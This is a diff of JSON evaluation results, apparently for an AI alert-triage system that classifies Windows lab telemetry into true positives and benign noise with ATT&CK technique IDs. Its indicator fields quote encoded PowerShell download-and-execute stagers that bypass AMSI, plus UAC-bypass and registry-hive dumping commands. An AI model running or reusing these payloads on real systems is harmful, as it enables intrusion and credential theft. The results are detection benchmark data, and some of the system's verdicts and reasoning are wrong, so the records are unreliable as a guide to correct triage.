9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAUgBTAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHUAbwBTAFcAbwBoAG4AbABDAFkAbABmAD0ATwBsAEsANwA2ADkAOAA0AHEAbQA2AGIAdQBXAFEAcQBnADUAcgB0AEIAKwB5AGsAdQA4AEEAPQAiACkAOwAkAGQAQQB0AEEAPQAkAEYAOQA0AEUALgBEAG8AdwBOAGwAbwBhAGQARABhAHQAYQAoACQAcwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABhAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAEEAVABhAFsANAAuAC4AJABEAEEAdABhAC4AbABlAG4ARwBUAEgAXQA7AC0ASgBPAGkATgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAEEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA="
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line",
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 38.55,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/9ce2145c16d7587d2a971f45bd4b85b4"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-083",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1218.002"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.85,
+      "technique_ids": [
+        "T1218.002"
+      ],
+      "ioc_refs": [
+        "C:\\Windows\\System32\\control.exe",
+        "\"C:\\windows\\system32\\control.exe\" C:\\ProgramData\\calc.cpl",
+        "C:\\ProgramData\\calc.cpl",
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line",
+        "events[0].process.parent.image"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 7.4,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/47199e491a7eaef4df4183accc70f44a"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-084",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.95,
+      "technique_ids": [],
+      "ioc_refs": [],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line",
+        "events[0].parent.image",
+        "launch context"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 9.53,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/e99961973cbab4098b86650483e24464"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-085",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1218.004"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.8,
+      "technique_ids": [
+        "T1218.004"
+      ],
+      "ioc_refs": [
+        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+        "10.10.10.5",
+        "172.18.39.5"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].network.dst_ip",
+        "events[0].network.dst_port",
+        "events[0].network.protocol",
+        "events[0].network.src_ip"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 12.44,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/13fdb9ffa1055aaec41eb23879458be8"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-092",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1003.001"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1003.001",
+        "T1059.003"
+      ],
+      "ioc_refs": [
+        "C:\\Users\\wardog\\Desktop\\Outflank-Dumpert.exe",
+        "Outflank-Dumpert.exe"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line",
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 8.26,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/221760fbe21caad8f56e5e63b8781d30"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-094",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1218.003"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1218.003",
+        "T1059.001"
+      ],
+      "ioc_refs": [
+        "C:\\Windows\\System32\\cmstp.exe",
+        "\"C:\\windows\\system32\\cmstp.exe\" /s C:\\ProgramData\\T1218.003_uacbypass.inf /au",
+        "C:\\ProgramData\\T1218.003_uacbypass.inf"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line",
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 21.56,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/6636bb7d878335593d49e630f204a8d0"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-098",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1059.001",
+        "T1021.006"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.9,
+      "technique_ids": [
+        "T1021.006",
+        "T1059.001"
+      ],
+      "ioc_refs": [
+        "SQBmACgAJABQAFMAVgBFAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAcwBJAG8AbgAuAE0AQQBKAG8AUgAgAC0AZwBlACAAMwApAHsAJAA0ADMARABFADIAPQBbAFIARQBGAF0ALgBBAHMAcwBFAG0AYgBsAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBnACcAKQA7AEkARgAoACQANAAzAGQARQAyACkAewAkADcAMQAyAGQAQgA9ACQANAAzAEQAZQAyAC4ARwBlAFQAVgBBAEwAdQBlACgAJABuAFUATABsACkAOwBJAEYAKAAkADcAMQAyAGQAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAGwATABFAEMAdABJAG8AbgBzAC4ARwBlAE4AZQBSAEkAYwAuAEQASQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAcgBJAG4ARgAsAFMAeQBTAFQAZQBNAC4ATwBCAEoARQBjAFQAXQBdADoAOgBuAEUAVwAoACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBsAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABiAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBsAH0ARQBsAHMAZQB7AFsAUwBjAHIASQBwAHQAQgBsAG8AYwBrAF0ALgAiAEcAZQB0AEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAG4AdQBsAEwALAAoAE4AZQB3AC0ATwBCAEoARQBDAHQAIABDAG8ATABsAEUAQwBUAGkATwBuAFMALgBHAGUATgBlAHIAaQBjAC4ASABhAFMASABTAGUAdABbAHMAVABSAEkATgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIARQBGAC4ARwBFAHQARgBpAEUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbABVAEUAKAAkAE4AVQBMAEwALAAkAFQAUgBVAGUAKQA7AH0AOwBbAFMAWQBzAHQAZQBNAC4ATgBFAFQALgBTAEUAcgB2AGkAYwBFAFAATwBJAE4AVABNAEEATgBBAGcAZQByAF0AOgA6AEUAWABQAGUAYwBUADEAMAAwAEMAbwBuAFQASQBOAFUAZQA9ADAAOwAkADgAZgA1AGIAOQA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAFkAcwB0AEUATQAuAE4ARQBUAC4AVwBFAEIAQwBMAEkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAdAByAEkAbgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBPAE0AQgBhAFMARQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaHBACcAOwAkADgAZgA1AEIAOQAuAEgAZQBBAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgARgA1AEIAOQAuAFAAcgBvAFgAWQA9AFsAUwBZAFMAdABFAG0ALgBOAEUAdAAuAFcAZQBCAFIAZQBxAHUARQBzAFQAXQA6ADoARABFAEYAYQBVAGwAVABXAEUAYgBQAFIAbwB4AHkAOwAkADgAZgA1AEIAOQAuAFAAUgBPAHgAeQAuAEMAcgBFAGQAZQBuAHQAaQBBAEwAcwAgAD0AIABbAFMAeQBzAHQARQBtAC4ATgBlAHQALgBDAHIARQBEAGUAbgBUAGkAQQBMAEMAQQBDAGgARQBdADoAOgBEAGUARgBBAHUATABUAE4ARQBUAFcATwByAEsAQwBSAGUAZABlAG4AdABJAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAdABlAE0ALgBUAGUAWAB0AC4ARQBOAGMATwBEAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawRSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABmADUAQgA5AC4ASABlAGEARABFAHIAcS4AEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AGkAVwArAGgAMwBaAEQAeABFADcAQwBhAEYASwBMADYARwBpAGUATQBZAHgAWABnAHoARgBFAD0AIgApADsAJABEAGEAVABhAD0AJAA4AGYANQBiADkALgBEAG8AdwBuAEwATwBhAGQARABhAHQAYQAoACQAUwBFAFIAKwAkAHQAKQA7ACQASQB2AD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABkAEEAVABhAD0AJABkAGEAVABBAFsANAAuAC4AJABEAEEAdABBAC4AbABFAE4AZwBUAEgAXQA7AC0ASgBvAEkAbgBbAEMAaABBAHIAWwBdAF0AKAAmACAAJABSACAAJABEAGEAVABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA="
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 96.32,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/0aa17d62f81375eaff4aeafee17fe550"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-118",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1003.002"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.9,
+      "technique_ids": [
+        "T1003.002"
+      ],
+      "ioc_refs": [
+        "reg  save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE",
+        "C:\\Windows\\System32\\reg.exe",
+        "C:\\Windows\\Temp\\SYSTEM_HIVE"
+      ],
+      "evidence_refs": [
+        "events[0].process.command_line",
+        "events[0].process.image",
+        "events[0].process.parent.image"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 10.35,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/cb114aba1319fdd7fe653fa748d19eec"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-119",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1059.003"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.9,
+      "technique_ids": [
+        "T1218.005",
+        "T1059.003",
+        "T1547.001"
+      ],
+      "ioc_refs": [
+        "C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.command_line",
+        "events[0].process.command_line",
+        "events[0].process.parent.image",
+        "events[0].process.image"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 17.37,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/4e35eeccf31c0e2d939a0826a4f5bd3b"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-132",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1218.013"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1218.013",
+        "T1055"
+      ],
+      "ioc_refs": [
+        "C:\\ProgramData\\T1055.dll"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line",
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 22.45,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/f418ab828cbb585f7489cd267d00e2d4"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-134",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.95,
+      "technique_ids": [],
+      "ioc_refs": [],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.parent.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 15.36,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/7bb295b3bac54b76030f728611ed1c46"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-137",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1110.003",
+        "T1558.003"
+      ],
+      "verdict": "benign_noisy",
+      "confidence": 0.85,
+      "technique_ids": [],
+      "ioc_refs": [
+        "C:\\Users\\pgustavo\\Downloads\\PurpleSharp.exe",
+        "PurpleSharp.exe  /t T1110.003,T1558.003,T1135,T1021.006"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line",
+        "events[0].process.parent.image"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 14.49,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/6c8afc3aea00967895de6dc8a7c54b56"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-150",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.95,
+      "technique_ids": [],
+      "ioc_refs": [],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line",
+        "events[0].parent.image",
+        "events[0].parent.command_line",
+        "events[0].user"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 13.69,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/e27095e2eae29fc22f9f2a9025aa5479"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-152",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1546.003"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.8,
+      "technique_ids": [
+        "T1059.001"
+      ],
+      "ioc_refs": [
+        "C:\\Users\\pgustavo\\Desktop\\MoveWMI.exe",
+        "172.18.39.6"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.parent.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 15.36,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/f5a54427cbc51d719711b0a4c40de8d7"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-153",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.95,
+      "technique_ids": [],
+      "ioc_refs": [
+        "HKU\\S-1-5-21-4228717743-1032521047-1810997296-1106\\Software\\Microsoft\\Windows\\Winlogon\\PasswordExpiryNotification\\NotShownTime",
+        "13::06::42, 2020/09/18"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].registry.target_object",
+        "events[0].registry.details"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 18.43,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/fb5428ef79ba2e31dc8f766c495299f4"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-154",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1059.003"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1218.004",
+        "T1059.003"
+      ],
+      "ioc_refs": [
+        "C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe",
+        "C:\\Windows\\System32\\cmd.exe",
+        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+        "c:\\ProgramData\\GruntHTTP.dll"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line",
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 15.45,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/c918f6fef3f84478fd83075629782e75"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-173",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1055"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.9,
+      "technique_ids": [
+        "T1027",
+        "T1003.001"
+      ],
+      "ioc_refs": [
+        "C:\\Users\\wardog\\Desktop\\ProcessHerpaderping.exe",
+        "C:\\Users\\wardog\\Desktop\\wardog.exe",
+        "C:\\windows\\System32\\SnippingTool.exe"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line",
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 30.55,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/c32744eece59b9dde02002f5d7e1f82a"
+    }
+  ],
+  "details": {
+    "day2-007": {
+      "label_rationale": "lsass.exe writing its own W32Time secure-time bookkeeping value; normal OS time-sync behavior.",
+      "reasoning": "LSASS.exe (SYSTEM) wrote a QWORD value to the W32Time SecureTimeLimits registry key, an atypical modification of a time service configuration that aligns with abuse of Windows Time providers for persistence.",
+      "retrieved_techniques": [
+        "T1547.005",
+        "T1003.001",
+        "T1547.003",
+        "T1547.002",
+        "T1547.008"
+      ],
+      "retrieved_rules": [
+        "e88a6ddc-74f7-463b-9b26-f69fc0d2ce85",
+        "612e47e9-8a59-43a6-b404-f48683f45bd6",
+        "f674e36a-4b91-431e-8aef-f8a96c2aca35",
+        "cbf93e5d-ca6c-4722-8bea-e9119007c248",
+        "d6a9b252-c666-4de6-8806-5561bbbd3bdc"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4193,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:41:15+00:00"
+    },
+    "day2-015": {
+      "label_rationale": "UserAssist UEME_CTLSESSION is a generic UI session counter, not a program-launch record.",
+      "reasoning": "The event shows Explorer.exe updating a UserAssist registry key (HKU\\...\\UserAssist\\Count\\HRZR_PGYFRFFVBA) with binary data, which is normal telemetry of program execution and not indicative of adversary persistence or other malicious technique.",
+      "retrieved_techniques": [
+        "T1547.001",
+        "T1547.004",
+        "T1546.008",
+        "T1036.007",
+        "T1555.004"
+      ],
+      "retrieved_rules": [
+        "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd",
+        "b29aed60-ebd1-442b-9cb5-16a1d0324adb",
+        "cbf93e5d-ca6c-4722-8bea-e9119007c248",
+        "9c226817-8dc9-46c2-a58d-66655aafd7dc",
+        "02ee49e2-e294-4d0f-9278-f5b3212fc588"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4133,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:41:25+00:00"
+    },
+    "day2-016": {
+      "label_rationale": "svchost writing to the Windows Notification platform's internal data cache; OS housekeeping.",
+      "reasoning": "Svchost.exe writing binary data to a registry key under Notifications\\\\Data is consistent with normal Windows notification storage, not a known persistence or execution technique. The registry path does not match typical autorun or service-related keys.",
+      "retrieved_techniques": [
+        "T1218.002",
+        "T1547.010",
+        "T1547.004",
+        "T1218.008",
+        "T1218.004"
+      ],
+      "retrieved_rules": [
+        "cbf93e5d-ca6c-4722-8bea-e9119007c248",
+        "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
+        "480421f9-417f-4d3b-9552-fd2728443ec8",
+        "a1e11042-a74a-46e6-b07c-c4ce8ecc239b",
+        "02ee49e2-e294-4d0f-9278-f5b3212fc588"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4181,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:41:33+00:00"
+    },
+    "day2-025": {
+      "label_rationale": "smartscreen.exe -Embedding is its normal COM self-launch; standard Windows Defender SmartScreen background activity.",
+      "reasoning": "The process smartscreen.exe was launched with the -Embedding flag by svchost.exe running the DcomLaunch service, indicating activation via DCOM. This matches the Distributed Component Object Model lateral movement technique (T1021.003) where adversaries use valid accounts to execute remote code through DCOM.",
+      "retrieved_techniques": [
+        "T1021.003",
+        "T1546.008",
+        "T1559.001",
+        "T1218.014",
+        "T1036.005"
+      ],
+      "retrieved_rules": [
+        "f1f3bf22-deb2-418d-8cce-e1a45e46a5bd",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "cbb9e3d1-2386-4e59-912e-62f1484f7a89",
+        "2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5",
+        "d06be4b9-8045-428b-a567-740a26d9db25"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4378,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:41:42+00:00"
+    },
+    "day2-027": {
+      "label_rationale": "WmiPrvSE -Embedding is the standard WMI provider host self-launch.",
+      "reasoning": "WmiPrvSE.exe is launched with -Embedding via DCOM from svchost.exe, which is a normal way the WMI provider host starts for legitimate WMI queries. No additional malicious indicators are present.",
+      "retrieved_techniques": [
+        "T1021.003",
+        "T1559.001",
+        "T1218.014",
+        "T1546.008",
+        "T1036.005"
+      ],
+      "retrieved_rules": [
+        "2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5",
+        "cbb9e3d1-2386-4e59-912e-62f1484f7a89",
+        "f1f3bf22-deb2-418d-8cce-e1a45e46a5bd",
+        "d21374ff-f574-44a7-9998-4a8c8bf33d7d",
+        "d06be4b9-8045-428b-a567-740a26d9db25"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4041,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:41:50+00:00"
+    },
+    "day3-042": {
+      "label_rationale": "hh.exe opens C:/ProgramData/T1218.001.chm, a compiled HTML file used to run code through the help viewer.",
+      "reasoning": "The alert shows PowerShell (parent) spawning hh.exe to open a CHM file located in ProgramData, indicating abuse of Compiled HTML files for execution (T1218.001) with PowerShell as the launcher (T1059.001). The use of a non-standard path for the CHM file adds suspicion.",
+      "retrieved_techniques": [
+        "T1218.001",
+        "T1059.001",
+        "T1216.002",
+        "T1547.001",
+        "T1218.004"
+      ],
+      "retrieved_rules": [
+        "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
